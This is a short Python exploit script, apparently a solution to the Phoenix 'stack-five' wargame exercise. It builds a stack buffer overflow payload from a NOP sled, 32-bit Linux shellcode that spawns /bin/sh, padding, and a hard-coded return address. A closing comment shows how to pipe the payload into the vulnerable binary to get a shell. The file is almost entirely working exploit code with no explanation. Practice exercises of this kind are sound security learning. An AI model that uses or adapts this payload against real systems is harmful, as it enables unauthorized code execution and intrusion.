import sys
import struct

offset = 140 
shellcode = b"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3h\x01\x01\x01\x01\x814\x24ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
address = 0xffffd5e0
shstack = 7*8
nopsled = 140 - len(shellcode) - shstack
address = address + nopsled//2

buf = b""
buf += b"\x90" * nopsled
buf += shellcode
buf += b"A" * shstack
buf += b"\xff\xff\xd5\xe0"[::-1]

sys.stdout.buffer.write(buf)

"""
ln -s /opt/phoenix/i486/stack-five
(python3 stack-five32.py; cat - ) | /home/user/stack-five 
"""
